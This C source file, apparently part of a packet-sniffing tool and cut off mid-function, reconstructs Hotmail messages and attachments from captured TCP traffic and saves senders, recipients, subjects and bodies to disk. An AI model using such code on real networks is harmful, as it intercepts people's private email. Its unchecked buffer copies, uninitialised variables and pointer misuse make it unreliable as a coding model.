#include "common.h"
int analyse_data(Mail_info *mail_info,char *data,unsigned int datalen,struct tcphdr *ptcp ,int is_b_s, 
                                  int (*Mycallbackfun_isend)(char *data, unsigned int datalen, struct tcphdr *tcp,Mail_info *mail_info),
                                  int (*Mycallbackfun_write)(Mail_info *mail_info),
                                  int fun_place)
{
	int result;
	char *dest = NULL;
	static int flag = -1;
	static int flagg = -1;
	
	if (NULL == data)
		return -2;
	
	if (is_b_s) 
	{
		if (!mail_info->is_complished) 
		{
			result = write_to_mail(mail_info, data, datalen, ptcp);
			if (-1 == result)
			{
				return -1;
			}
		}
	} 
	else 
	{
		if (2 == fun_place)
		{
			result = Mycallbackfun_isend(data,datalen,ptcp,mail_info);
			if (1 == result)
				return 0;
		}
		
		if (!strncmp(data, "HTTP/1.", 7) && !strncmp(data + 8, " 200 OK\r\n", 9))
		{
			if(strstr(data, "Content-Encoding: gzip\r\n"))
				flag = 1;
			else
				flag = 0;
			if(strstr(data, "Transfer-Encoding: chunked\r\n"))
				flagg = 1;
			else
				flagg = 0;
		}
		
		if (!mail_info->is_complished) 
		{
			if(flagg == 0)
			{
				result = write_to_okdata(mail_info, data, datalen, ptcp);
				mail_info->is_ok_chunked = 0;
				flagg = -1;
			}
			else
			{
				result = write_to_okdata_chunked_gzip(mail_info, data, datalen, ptcp);
				mail_info->is_ok_chunked = 1;
				flagg = -1;
			}
			
			if (result == -1)
				return -1;
		}
		
		if (0 == fun_place)
		{
			result = Mycallbackfun_isend(data,datalen,ptcp,mail_info);
			if (1 == result)
				return 0;
			
			if (1 == mail_info->is_complished)
			{
			// common_before_writebody(flag, mail_info);
				if(1 == flag)
				{
					if (mail_info->is_ok_chunked)
					{
						Chunked(mail_info);
						if (-1 == decompress(&mail_info->recive_data, mail_info->recive_length))
						{
							return -1;
						}
					}
					else
					{
						if (-1 == decompress(&mail_info->recive_data, mail_info->recive_length-2))
						{
							return -1;
						}
					}
					flag = -1;
				}
				if(-1 == Mycallbackfun_write (mail_info))
				{
					return -1;
				}
			}
		}
	}
	
	if (1 == fun_place)
	{
		result = Mycallbackfun_isend(data,datalen,ptcp,mail_info);
		if (1 == result)
			return 0;
		
		if (1==mail_info->is_complished)
		{
			// common_before_writebody(flag, mail_info);
			if((1==flag) && (NULL != mail_info->recive_data))
			{
				if (mail_info->is_ok_chunked)
				{
					Chunked(mail_info);
					if (-1 == decompress(&mail_info->recive_data, mail_info->recive_length))
					{
						return -1;
					}
				}
				else
				{
					if (-1 == decompress(&mail_info->recive_data, mail_info->recive_length-2))
					{
						return -1;
					}
				}
				flag = -1;
			}
			if(-1== Mycallbackfun_write (mail_info))
			{
				return -1;
			}
		}
	}
	return 0;
}

int decompress(char **body, int bodyLen)
{
	int result ;
	char *dest = NULL;
	char *data = *body;
	result = decomp_gzip_3(data, bodyLen, &dest);
	if (result == -1)
	{
		result = decomp_gzip_1(data, bodyLen, &dest);
		if (result == -1)
		{
			result = decomp_gzip_2(data, bodyLen, &dest);
			if (result == -1) 
			{
				result = decomp_gzip(data, bodyLen, &dest);
			}
		}
	}
	
	if (-1 == result)
	{
		return -1;
	}
    
	free(data);
	*body = dest;         //printf("\nmail_info->recive_data = %s\n",dest);
	dest = NULL;
    
	return result;
}

char *clear_rec_content(char *source)
{
	if (source == NULL)
		return NULL;
	
	char *str = strdup(source);
	if (str == NULL)
		return NULL;
	
	int result;
	result = cns_str_ereplace(&str, "\\\\r\\\\n", "\n");
	if (-1 != result)
		result = cns_str_ereplace(&str, "\\\\\\\\", "\\");
	return str;
}

char *clear_send(char *source)
{
    if (source == NULL)
		return NULL;
	
	char *str = strdup(source);
	if (str == NULL)
		return NULL;

	int result;
	if (result != -1)
		result = cns_str_ereplace(&str, "\"(.*?)\"", "");
	if (result != -1)
		result = cns_str_ereplace(&str, " ", "");
	if (result != -1)
		result = cns_str_ereplace(&str, "<", "");
	if (result != -1)
		result = cns_str_ereplace(&str, ">", "");
	return str;
}


size_t GetUTF8LenFromUCS2_mail(const u_short* ucs2, size_t len)
{
    //assert(ucs2 != NULL);
	if (ucs2 == NULL)
		return 0;
	
    size_t i = 0;
    size_t utf8Len = 0;
    if (len == 0) {
        i = 0;
        while(ucs2[i] != 0x0000) {
            if (ucs2[i] < 0x80) {
                ++utf8Len;
            } else if (ucs2[i] < 0x800) {
                utf8Len += 2;
            } else {
                utf8Len += 3;
            }
            ++i;
        }
    } else {
        for ( i = 0; i < len; ++i) {
            if (ucs2[i] == 0x00) {
                break;
            } else if (ucs2[i] < 0x80) {
                ++utf8Len;
            } else if (ucs2[i] < 0x800) {
                utf8Len += 2;
            } else {
                utf8Len += 3;
            }
        }
    }

    return utf8Len;
}
char* UCS2ToUTF8_mail(const u_short* ucs2, size_t len)
{
    //assert(ucs2 != NULL);
	if (ucs2 == NULL)
		return NULL;
	
    size_t utf8Len = GetUTF8LenFromUCS2_mail(ucs2, len);
    char* utf8 =(char*) malloc(utf8Len + 1);
    char* utf8start = utf8;
    size_t i = 0;
    if (len == 0) {
        i = 0;
        while(ucs2[i] != 0x0000) {
            if (ucs2[i] < 0x80) {
                *utf8++ = ucs2[i];
            } else if (ucs2[i] < 0x800) {
                *utf8++ = ((ucs2[i] >> 6) & 0x1f) | 0xc0;
                *utf8++ = (ucs2[i] & 0x3f) | 0x80;
            } else {
                *utf8++ = ((ucs2[i] >> 12) & 0x0f) | 0xe0;
                *utf8++ = ((ucs2[i] >> 6) & 0x3f) | 0x80;
                *utf8++ = (ucs2[i] & 0x3f) | 0x80;
            }
            ++i;
        }
        *utf8 = 0x00;
    } 
   else {
        for ( i = 0; i < len; ++i) {
            if (ucs2[i] == 0x00) {
                break;
            } else if (ucs2[i] < 0x80) {
                *utf8++ = ucs2[i];
            } else if (ucs2[i] < 0x800) {
                *utf8++ = ((ucs2[i] >> 6) & 0x1f) | 0xc0;
                *utf8++ = (ucs2[i] & 0x3f) | 0x80;
            } else {
                *utf8++ = ((ucs2[i] >> 12) & 0x0f) | 0xe0;
                *utf8++ = ((ucs2[i] >> 6) & 0x3f) | 0x80;
                *utf8++ = (ucs2[i] & 0x3f) | 0x80;
            }
        }
        *utf8 = 0x00;
    }

    return utf8start;
}

int strtonum(char * size)
{
	int i = 0, res = 0, len = strlen(size);
	while(i < len)
	{
		res = res*10 + size[i] - 48;
		i++;
	}
	
	return res;
}

char *hotmail_conv_to_utf8(char *src)
{
	if (src == NULL)
		return NULL;

	char *dest = strdup(src);
	if (dest == NULL)
		return NULL;

	return dest;
}

int hotmail_str_convert(char *str, size_t max_len)
{
	char *tmp1 = NULL;
	size_t len;

	tmp1 = hotmail_conv_to_utf8(str);
	if (NULL == tmp1)
		return -1;
	len = strlen(tmp1);
	if (len > max_len)
		len = max_len;
	memcpy(str, tmp1, len);
	str[len] = 0;
	free(tmp1);
	tmp1 = NULL;
	return 0;
}

int hotmail_str_convert2(char *str, size_t max_len)
{
	char *tmp1 = NULL;
	size_t len;

	tmp1 = hotmail_conv_to_utf8(str);
	if (NULL == tmp1)
		return -1;
	len = strlen(tmp1);
	if (len > max_len)
		len = max_len;
	memcpy(str, tmp1, len);
	str[len] = 0;
	free(tmp1);
	tmp1 = NULL;
	return 0;
}

int write_hotmail_send(Mail_info *mail_info)
{////printf("\n                writefilehotmail\n");
	char *p1 = NULL, *p2 = NULL, *p3 = NULL;
	char *tmp_str = NULL, *tmp_p = NULL;
	Attach_info *attach_info;
	char ID[MAX_ID_LEN + 1];
	char ID_temp[MAX_ID_LEN + 1];
	char filename[MAX_FN_LEN + 1];
	char writepath[MAX_PATH_LEN + 1];
	char boundary[MAX_BOUN_LEN + 1];
	int boun_len;
	int result;
	int flag = 0;
	int i = 0;
	size_t len;
	
	////printf("%s\n", mail_info->mail_data);

	memset(ID, 0, MAX_ID_LEN + 1);
	memset(ID_temp, 0, MAX_ID_LEN + 1);

	boun_len = get_boundary(mail_info->mail_data, boundary);
	if (boun_len == -1)
		return -1;

	p1 = strstr(mail_info->mail_data, "; name=\"fFrom\"\r\n\r\n");
	if (p1 == NULL)
		return -1;
	p1 += 18;
	p2 = strstr(p1, boundary);
	len = p2 - p1 - 4;
	if (p2 == NULL)
		return -1;
	if (len > MAX_FROM_LEN)
		len = MAX_FROM_LEN;
	memcpy(mail_info->from, p1, len);
	mail_info->from[len] = 0;
	p2 += boun_len;

	p1 = strstr(p2, "; name=\"fTo\"\r\n\r\n");
	if (p1 == NULL)
		return -1;
	p1 += 16;
	p2 = strstr(p1, boundary);
	len = p2 - p1 - 4;
	if (p2 == NULL)
		return -1;
	if (len > MAX_TO_LEN)
		len = MAX_TO_LEN;
	memcpy(mail_info->to, p1, len);
	mail_info->to[len] = 0;

	tmp_p = clear_send(mail_info->to);
	memset(mail_info->to, 0, MAX_TO_LEN + 1);
    strcpy(mail_info->to, tmp_p);
	free(tmp_p);
	tmp_p = NULL;
    //printf("to:%s\n", mail_info->to);
	p2 += boun_len;

	p1 = strstr(p2, "; name=\"fCc\"\r\n\r\n");
	if (p1 != NULL) 
	{
		p1 += 16;
		p2 = strstr(p1, boundary);
		len = p2 - p1 - 4;
		if (p2 != NULL) 
		{
			if (len > MAX_CC_LEN)
				len = MAX_CC_LEN;
			memcpy(mail_info->cc, p1, len);
			mail_info->cc[len] = 0;
		} 
		else 
		{
			mail_info->cc[0] = 0;
		}
	} 
	else 
	{
		mail_info->cc[0] = 0;
	}
    strcpy(mail_info->cc, clear_send(mail_info->cc));
	//printf("cc :%s \n",mail_info->cc);
	p1 = strstr(p2, "; name=\"fBcc\"\r\n\r\n");
	if (p1 != NULL) 
	{
		p1 += 17;
		p2 = strstr(p1, boundary);
		len = p2 - p1 - 4;
		if (p2 != NULL) 
		{
			if (len > MAX_BCC_LEN)
				len = MAX_BCC_LEN;
			memcpy(mail_info->bcc, p1, len);
			mail_info->bcc[len] = 0;
		} 
		else 
		{
			mail_info->bcc[0] = 0;
		}
	} 
	else 
	{
		mail_info->bcc[0] = 0;
	}
    strcpy(mail_info->bcc, clear_send(mail_info->bcc));
	//printf("bcc :%s \n",mail_info->bcc);
	p1 = strstr(p2, "; name=\"fSubject\"\r\n\r\n");
	if (p1 == NULL)
		return -1;
	p1 += 21;
	p2 = strstr(p1, boundary);
	len = p2 - p1 - 4;
	if (p2 == NULL)
		return -1;
	if (len > MAX_SUBJ_LEN)
		len = MAX_SUBJ_LEN;
	memcpy(mail_info->subject, p1, len);
	mail_info->subject[len] = 0;
	p2 += boun_len;

	p1 = strstr(p2, "; name=\"fMessageBody\"\r\n\r\n");
	if (p1 == NULL)
		return -1;
	p1 += 25;
	p2 = strstr(p1, boundary);
	len = p2 - p1 - 4;
	if (p2 == NULL)
		return -1;
	mail_info->content = (char *)malloc(len + 1);
	if (mail_info->content == NULL)
		return -1;
	memcpy(mail_info->content, p1, len);
	mail_info->content[len] = 0;
	p2 += boun_len;

	create_dir(mail_info->save_path, "hotmail", mail_info->from);
	p1 = strstr(mail_info->mail_data, "; name=\"fAttachments_data\"\r\n\r\n");
	p1 += 30;
	p2 = strstr(p1, "\r\n-----");
	
	Attach_info * sjs = attach_tab.head->next;
  //  
  //  //printf("list attach head ID : %s\n", sjs->ID_str);

	while (p1 < p2) 
	{
		p3 = strstr(p1, "\r\n---");
		if (p3 == NULL || p3 > p2)
			p3 = p2;
		len = p3 - p1;
		memcpy(ID_temp, p1, len);
		ID_temp[len] = 0;
		htmldecode_full(ID_temp, ID_temp);
		char *front = ID_temp;
		char *back = strstr(front,"/");
		while(back)
		{
			back = strstr(back,"|");
			back += 1;
			memcpy(ID, back, 36);
			ID[36] = 0;
			//LOG_INFO("mail ID : %s\n", ID);
			attach_info = find_attach(ID);
			if (attach_info == NULL) 
			{
				////printf("not fond attach id ...\n");
				p1 = p3;
				continue;
			}
			i++;
			Attachment *attachment = (Attachment *)malloc(sizeof(Attachment));
			if (attachment == NULL)
				continue;
// 			//printf("attach_info->attach_name1 : %s",attach_info->attach_name);
			result = hotmail_str_convert(attach_info->attach_name, MAX_PATH_LEN);
			if (result == -1)
				return -1;
			//printf("attach_info->attach_name2 : %s\n",attach_info->attach_name);
			get_file_name(attach_info->attach_name, filename);
			snprintf(attachment->loc_name, MAX_FN_LEN, "%s", filename);
			snprintf(attachment->loc_filename, MAX_FN_LEN, "attach%d", i);
// 			//printf( "attach%d_%s\n", i, filename);
			//snprintf(attachment->loc_filename, MAX_FN_LEN, "attach%d_%s", i, filename);
			attachment->next = NULL;
			snprintf(writepath, MAX_PATH_LEN, "%s/%s", mail_info->save_path, attachment->loc_filename);
			link(attach_info->path_of_here, writepath);
			unlink(attach_info->path_of_here);
			delete_attach(attach_info);
		//	trim_attach(attachment->loc_filename, 47);
			if (!flag) 
			{
				mail_info->attach = attachment;
				flag = 1;
			} 
			else 
			{
				attachment->next = mail_info->attach->next;
				mail_info->attach->next = attachment;
			}
			back = strstr(back,"/");
		}
		p3++;
		p1 = p3;
	}
	//printf("attach number :%d\n",i );
	result = hotmail_str_convert(mail_info->to, MAX_TO_LEN);
	if (result == -1)
		return -1;
	result = hotmail_str_convert(mail_info->cc, MAX_CC_LEN);
	if (result == -1)
		return -1;
	result = hotmail_str_convert(mail_info->bcc, MAX_BCC_LEN);
	if (result == -1)
		return -1;
	//printf("bcc :%s \n",mail_info->bcc);
	result = hotmail_str_convert(mail_info->subject, MAX_SUBJ_LEN);
	if (result == -1)
		return -1;
	tmp_str = hotmail_conv_to_utf8(mail_info->content);
	if (NULL == tmp_str)
		return -1;
	free(mail_info->content);
	mail_info->content = clear_html_tag(tmp_str);
	free(tmp_str);
	tmp_str = NULL;
	if (NULL == mail_info->content)
		return -1;

	write_to_file(mail_info);
    //delete_mail_info(mail_info);

	return -1;
}

int trim_hotmail_attach(char *filename)
{
	int fd;
	int stat = 0;
	int have_fixed = 0;
	off_t total_len, n;
	char *buf;

	fd = open(filename, O_RDWR);
	total_len = lseek(fd, 0, SEEK_END);
	buf = (char *)mmap(NULL, total_len, PROT_READ, MAP_SHARED, fd, 0);
	if (buf == NULL) {
		close(fd);
		return -1;
	}

	n = total_len - 5;
	while (n > 0) {
		switch (stat) {
		case 0:
			if (!strncmp(buf + n, "-----", 5))
				stat = 1;
			n -= 5;
			break;
		case 1:
			if (strncmp(buf + n, "---", 3))
				stat = 2;
			n -= 5;
			break;
		case 2:
			if (!strncmp(buf + n, "-----", 5))
				stat = 3;
			n -= 5;
			break;
		case 3:
			if (buf[n] == '-') {
				n--;
				break;
			} else {
				munmap(buf, total_len);
				n--;
				ftruncate(fd, n);
				close(fd);
				return 1;
			}
		}
	}
	munmap(buf, total_len);
	close(fd);
	return 0;
}

int hotmail_send_isend(char *data, unsigned int datalen, struct tcphdr *tcp,Mail_info *mail_info)
{
    if (!strncmp(data, "HTTP/1.", 7) && !strncmp(data + 8, " 200 OK\r\n", 9))
    {
        mail_info->is_complished = 1;
        get_time(data, mail_info->sent_time);
    }
    return 0;
}

int analyse_hotmail_mail(Mail_info *mail_info, char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s)
{////printf("\n                analyse_hotmail_mail\n");//printf("\ndata_len = %d,data = %s\n",data_len,data);
	unsigned int seq = ntohl(ptcp->seq);
	int off_seq;
	int result;

	off_seq = seq - mail_info->start_seq;
	if (is_to_s) 
	{
		if (!mail_info->is_complished) 
		{
			result = write_to_mail(mail_info, data, data_len, ptcp);
			return result;
		}
	} 
	else if (!strncmp(data, "HTTP/1.1 200 OK\r\n", 15))
	{
		get_time(data, mail_info->sent_time);
		mail_info->is_complished = 1;
		write_hotmail_send(mail_info);
		del_mail_node(mail_info);
	}
	
	return 0;
}

int analyse_hotmail_delete(Mail_info *mail_info, char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s)
{
	unsigned int seq;
	int off_seq;
	int result;

	seq = ntohl(ptcp->seq);
	off_seq = seq - mail_info->start_seq;
	if (is_to_s) 
	{
		if (!mail_info->is_complished) 
		{
			result = write_to_mail(mail_info, data, data_len, ptcp);
			return result;
		}
	} 
	else if (!strncmp(data, "HTTP/1.1 200 OK\r\n", 15))
	{
		char ID[MAX_ID_LEN];
		char temp[MAX_ID_LEN];
		char *p1, *p2;
		int i, j;
		size_t len;
		Attach_info *attach_info;

		mail_info->is_complished = 1;
		p1 = strstr(mail_info->mail_data, "\r\n\r\n");
		if (p1 == NULL) {
			return -1;
		}
		p1 += 4;

		p2 = strstr(p1, "Attachment_ec&d=%22");
		if (p2 == NULL) {
			return -1;
		}
		p2 += 19;

		p1 = strstr(p2, "%22,");
		if (p1 == NULL) {
			return -1;
		}

		len = p1 - p2;
		memcpy(ID, p2, len);
		ID[len] = 0;
		htmldecode_full(ID, temp);
		len = strlen(temp);
		for (i = 0, j = 0; i < len; i++) {
			if (temp[i] == '\\')
				continue; 
			ID[j] = temp[i];
			j++;
		}
		ID[j] = 0;
		attach_info = find_attach(ID);
		if (attach_info != NULL) 
		{
			delete_attach(attach_info);
		}
		//delete(mail_info);
		return -1;
	}
	else 
	{
		return -1;
	}
}

int analyse_hotmail_attach_head(Attach_info *attach_info,char *data, unsigned int datalen,unsigned int seq)
{
	int fd;
	//char file_name_pattern[] = "filename: (.*)\r\ncontent-type: ";
	char *p = NULL;
	struct timeval tv;
	struct timezone tz;
	int off_seq;
	mode_t file_mode = S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH;
	int result;

	//result = regcompile_2(attach_info->ok_data, file_name_pattern, &attach_info->path_of_sender);//2
	off_seq = seq - attach_info->start_seq;
	if (off_seq + datalen > attach_info->ok_len)
		return -1;
	memcpy(attach_info->ok_data + off_seq, data, datalen);

	p = strstr(attach_info->ok_data,"filename: ");
	if (p==NULL)
		return 0;
	p = strstr(p, "\r\n\r\n");
	if (p==NULL) {
		return 0;
	}
	p += 4;
	attach_info->start_seq = p - attach_info->ok_data + attach_info->start_seq;//1
	if (result == -1)
		return -1;

	/*result = regcompile_1(attach_info->ok_data, "; KVC=(.*); mt=", attach_info->ID_str, MAX_ID_LEN);
	if(result == -1)
	{
		result = regcompile_1(attach_info->ok_data, "; mt=(.*); KVC=", attach_info->ID_str, MAX_ID_LEN);
	}
	if (result == -1) 
	{
		return -1;
	}*/
	
	gettimeofday(&tv, &tz);
	snprintf(attach_info->path_of_here, MAX_PATH_LEN, "%s/%lu-%lu", mail_temp_path, tv.tv_sec, tv.tv_usec);
	fd = open(attach_info->path_of_here, O_RDWR | O_CREAT, file_mode);
	if (fd == -1)
		return -1;
	write(fd,p,off_seq + datalen - (p - attach_info->ok_data));
	close(fd);
	free(attach_info->ok_data);
	attach_info->ok_data = NULL;
	attach_info->is_writing=1; //4
	
	////printf("head attach id : %s\n", attach_info->ID_str);
	
	return 0;
}

int analyse_hotmail_attach_1(Attach_info *attach_info, char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s)
{
	unsigned int seq;
	int off_seq;
	int result;
	
	////printf("%s\n", data);

	seq = ntohl(ptcp->seq);
	off_seq = seq - attach_info->start_seq;
	if (is_to_s) 
	{
		if (attach_info->is_writing) 
		{
			result = write_to_attach(attach_info, data, data_len, seq);
		} 
		else 
		{
			result = analyse_hotmail_attach_head(attach_info,data,data_len,seq);
		}

		return result;
	} 
	else 
	{
		if (!attach_info->is_get_ok) 
		{
			int i;
			char http_ok_head[21] = "HTTP/1.1 200 OK\r\n";
			
			if (!strncmp(data, http_ok_head, 17)) 
			{
				int len;
				char *p = NULL;
				
				////printf("2 .. 1 .. 1\n");
			
				trim_hotmail_attach(attach_info->path_of_here);
				trim_attach(attach_info->path_of_here, 102);
				attach_info->is_writing = 0;
				attach_info->is_get_ok = 1;
				len = get_http_length(data);
				attach_info->ok_len = len;
				len += 100;  //12
				if (len <= 0) 
				{
					return -1;
				}
				////printf("2 .. 1 .. 2\n");
				if (strstr(data, "\r\nContent-Encoding: gzip\r\n")) 
				{
					attach_info->ok_gzip = 1;
				} 
				else 
				{
					attach_info->ok_gzip = 0;
				}

                if (attach_info->ok_data)
                {
                    free(attach_info->ok_data);
                    attach_info->ok_data = NULL;
                }
                
				attach_info->ok_data = (char *)malloc((size_t)(len + 1));
				if (attach_info->ok_data == NULL)
					return -1;
				////printf("2 .. 1 .. 3\n");
				memset(attach_info->ok_data, 0, len + 1);
				p = strstr(data, "\r\n\r\n");
				p += 4;
				len = data_len - (p - data);
				if (len > attach_info->ok_len)
					return -1;
				////printf("2 .. 1 .. 4\n");
				memcpy(attach_info->ok_data, p, len);
				attach_info->ok_start_seq = seq + p - data;

				if (strstr(p, "\r\n\r\n") != NULL || !memcmp(data + data_len - 3, "\0\0\0", 3)) 
				{
					////printf("2 .. 1 .. 5\n");
					char *dest;
					if (attach_info->ok_gzip) 
					{
						result = decomp_gzip(attach_info->ok_data, attach_info->ok_len - 1, &dest);
						if (result == -1)
						{
							return -1;
						}
					}
					////printf("2 .. 1 .. 6\n");
					attach_info->is_get_ok = 0;
					attach_info->is_complished = 1;
					char ID_str[MAX_ID_LEN + 1];
					result = regcompile_1(dest, "Id&quot;:&quot;(.*)&quot;,", ID_str, MAX_ID_LEN);
					char * p1 = ID_str;
					char * p2 = strstr(p1,"/");
					p2 = strstr(p2,"|");
					p2 += 1;
					memcpy(attach_info->ID_str, p2, 36);
					attach_info->ID_str[36] = 0;
                    //
				//	//printf("hotmail attach ID : %s\n", attach_info->ID_str);
					p2 += 36;
					p1 = strstr(p2,"|");
					strncpy(attach_info->attach_name,p2,p1-p2);
					attach_info->attach_name[p1-p2]=0;
					free(dest);
					dest = NULL;
					if (result == -1) 
					{
						return -1;
					}
					////printf("2 .. 1 .. 7\n");
				}

				return 0;
			}
		} 
		else 
		{
			////printf("2 .. 2\n");
			int off_seq = seq - attach_info->ok_start_seq;
			if (off_seq + data_len > attach_info->ok_len)
				return -1;
			memcpy(attach_info->ok_data + off_seq, data, data_len);
			////printf("2 .. 2 .. 1\n");
			////printf("%s\n", data);
			if (strstr(data, "\r\n\r\n") != NULL || !memcmp(data + data_len - 2, "\0\0\0", 3)) 
			{
				////printf("2 .. 2 .. 2\n");
				char *dest;

				if (attach_info->ok_gzip) 
				{
					result = decomp_gzip(attach_info->ok_data, attach_info->ok_len - 1, &dest);
					if (result == -1) 
					{
						return -1;
					}
				}
				////printf("2 .. 2 .. 3\n");
				attach_info->is_get_ok = 0;
				attach_info->is_complished = 1;
				////printf("IDD1 : %s\n", attach_info->ID_str);
				////printf("\n%s\n", dest);
				char ID_str[MAX_ID_LEN + 1];
				result = regcompile_1(dest, "Id&quot;:&quot;(.*)&quot;,", ID_str, MAX_ID_LEN);
				char * p1 = ID_str;
				char * p2 = strstr(p1,"/");
				p2 = strstr(p2,"|");
				p2 += 1;
				memcpy(attach_info->ID_str, p2, 36);
				attach_info->ID_str[36] = 0;
                
                //printf("attach_id:%s\n", attach_info->ID_str);
				p2 += 36;
				p1 = strstr(p2,"|");
				strncpy(attach_info->path_of_sender, p2, p1-p2);
				attach_info->attach_name[p1-p2]=0;
				free(dest);
				dest = NULL;
				if (result == -1) 
				{
					return -1;
				}
				////printf("IDD2 : %s\n", attach_info->ID_str);
				////printf("2 .. 2 .. 4\n");
			}
			
			////printf("2 .. 2 .. 5\n");

			return 0;
		}
	}
}

int analyse_hotmail_attach_2(Attach_info *attach_info, char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s)
{
	unsigned int seq;
	int off_seq;
	int result;

	seq = ntohl(ptcp->seq);
	off_seq = seq - attach_info->start_seq;
	if (is_to_s) 
	{
		if (attach_info->is_writing) 
		{
			result = write_to_attach(attach_info, data, data_len, seq);
		} 
		else 
		{
			////printf("1 .. 2\n");
			result = analyse_hotmail_attach_head(attach_info,data,data_len,seq);
		}
		
		return result;
	} 
	else 
	{
		////printf("1 .. 3\n");
		if (!strncmp(data, "HTTP/1.1 200 OK\r\n", 17)) 
		{
			trim_attach(attach_info->path_of_here, 754);
			attach_info->is_complished = 1;
			
			return 0;
		}
		
		return -1;
	}
}

Attach_info *find_photo_attach(Attach_info *attach_info, char *filename1)
{
	Attach_info *attach_tmp1 = attach_tab.head->next;
	char filename2[MAX_FN_LEN + 1];
	int result;

	while (attach_tmp1 != NULL) 
	{
		if (!strcmp(attach_info->ID_str, attach_tmp1->ID_str)) 
		{
			result = get_file_name(attach_tmp1->path_of_sender, filename2);
			if (result == -1) 
			{
				attach_tmp1 = attach_tmp1->next;
				continue;
			}
			if (!strcmp(filename1, filename2))
				return attach_tmp1;
		}
		attach_tmp1 = attach_tmp1->next;
	}

	return attach_tmp1;
}

int analyse_hotmail_attach_3(Attach_info *attach_info, char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s)
{
	unsigned int seq;
	int off_seq;
	int result;

	seq = ntohl(ptcp->seq);
	if (!is_to_s) 
	{
		////printf("2\n");
		int i;
		if (!strncmp(data, "HTTP/1.1 200 OK\r\n", 17)) 
		{
			////printf("IDD2 : %s\n", attach_info->ID_str);
			////printf("2 .. 1\n");
			int len;
			char *p;

			p = strstr(attach_info->ok_data, "&mt=");
			if (p != NULL) 
			{
				p += 4;
				len = strlen(p);
				if (len > MAX_ID_LEN)
					return -1;
				strcpy(attach_info->ID_str, p);
				free(attach_info->ok_data);
				attach_info->ok_data == NULL;
			}
			
			////printf("2 .. 2\n");
			////printf("IDD2 : %s\n", attach_info->ID_str);

			attach_info->is_writing = 0;
			attach_info->is_get_ok = 1;
			len = get_http_length(data);
			attach_info->ok_len = len;
			len += 100;  //12

			if (len == -1) 
			{
				return -1;
			}
			if (len == 0)
				return 0;
				
			////printf("2 .. 3\n");
			////printf("IDD2 : %s\n", attach_info->ID_str);

			if (strstr(data, "\r\nContent-Encoding: gzip\r\n")) 
			{
				attach_info->ok_gzip = 1;
			} 
			else 
			{
				attach_info->ok_gzip = 0;
			}

            if (attach_info->ok_data)
            {
                free(attach_info->ok_data);
                attach_info->ok_data = NULL;
            }
            
			attach_info->ok_data = (char *)malloc((size_t)(len + 1));
			if (attach_info->ok_data == NULL) 
			{
				return -1;
			}
			////printf("2 .. 4\n");
			////printf("IDD2 : %s\n", attach_info->ID_str);
			memset(attach_info->ok_data, 0, len + 1);
			p = strstr(data, "\r\n\r\n");
			p += 4;
			len = data_len - (p - data);
			if (len > attach_info->ok_len)
				return -1;
			////printf("2 .. 5\n");
			////printf("IDD2 : %s\n", attach_info->ID_str);
			memcpy(attach_info->ok_data, p, len);
			attach_info->ok_start_seq = seq + p - data;

			if (strstr(p, "\r\n\r\n") != NULL || !memcmp(data + data_len - 2, "\0\0\0", 3)) 
			{
				////printf("2 .. 6\n");
				////printf("IDD2 : %s\n", attach_info->ID_str);
				char *dest, *p1, *p2, *id;
				Attach_info *temp;
				char filename[MAX_FN_LEN + 1];
				int result;
				size_t len;

				if (attach_info->ok_gzip) 
                {
					result = decomp_gzip(attach_info->ok_data, attach_info->ok_len - 1, &dest);
					if (result == -1)
						return -1;
				}
				////printf("2 .. 7\n");
				////printf("IDD2 : %s\n", attach_info->ID_str);
				p1 = dest;
				memset(filename, 0, MAX_FN_LEN + 1);
				del_attach_node(attach_info);
				while (1) 
				{
					////printf("2 .. 8\n");
					p1 = strstr(p1, "new HM.SendPhotoUploadResult(\"");
					if (p1 == NULL)
						break;
					p1 += 30;
					p2 = strstr(p1, "\",\"u|");
					if (p2 == NULL)
						break;
					len = p2 - p1;
					if (len > MAX_FN_LEN)
						break;
					memcpy(filename, p1, len);
					filename[len] = 0;
					////printf("2 .. 9\n");
					////printf("IDD2 : %s\n", attach_info->ID_str);
					temp = find_photo_attach(attach_info, filename);
					p2 += 3;
					p1 = strstr(p2, "||\",");
					if (temp == NULL)
						continue;
					if (p1 == NULL)
						break;
					len = p1 - p2 + 2;
					if (len > MAX_ID_LEN)
						break;
					memcpy(temp->ID_str, p2, len);
					temp->ID_str[len] = 0;
					////printf("2 .. 10\n");
					////printf("IDD2 : %s\n", attach_info->ID_str);
				}
				delete_attach(attach_info);
				free(dest);
				dest = NULL;
				
				////printf("2 .. 11\n");
				////printf("IDD2 : %s\n", attach_info->ID_str);
			}
		} 
		else 
		{
			////printf("3\n");
			int off_seq;
			off_seq = seq - attach_info->ok_start_seq;
			if (off_seq + data_len > attach_info->ok_len)
				return -1;
			////printf("3 .. 1\n");
			memcpy(attach_info->ok_data + off_seq, data, data_len);
			////printf("%s\n", data);
			if (strstr(data, "\r\n\r\n") != NULL || !memcmp(data + data_len - 2, "\0\0\0", 3)) 
			{
				////printf("3 .. 2\n");
				/*char *dest;
				if (attach_info->ok_gzip) 
				{
					result = decomp_gzip(attach_info->ok_data, attach_info->ok_len - 1, &dest);
					if (result == -1) 
					{
						return -1;
					}
				}
				attach_info->is_get_ok = 0;
				attach_info->is_complished = 1;
				result = regcompile_1(dest, "id=\"HiddenFileName\" value=\"(.*)\" />\r\n    <input name=\"HiddenAttachments\" ", attach_info->ID_str, MAX_ID_LEN);
					
				//printf("hotmail attach ID : %s\n", attach_info->ID_str);
					
				free(dest);
				if (result == -1) 
				{
					return -1;
				}*/
			}
		}
	} 
	else 
	{
		unsigned int off_seq = seq - attach_info->start_seq;

		if (off_seq < 0) 
		{
			data_len += off_seq;
			if (data_len < 1)
				return 0;
			data -= off_seq;
			off_seq = 0;
		}
		if (off_seq + data_len > attach_info->ok_len)
			return -1;
		memcpy(attach_info->ok_data + off_seq, data, data_len);
		return 0;
	}
}

int analyse_hotmail_attach_4(Attach_info *attach_info, char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s)
{
// 	//printf("\nanalyse_hotmail_attach_4\n");
	unsigned  int seq=ntohl(ptcp->seq);
	int result=0;
        int off_seq;
        int data_seq;
        int flag = 0;
        char *p;
	if(is_to_s)
	{////printf("\n1\n");
		if (!strncmp(data, "POST /mail/AttachmentUploader.aspx?", 35))
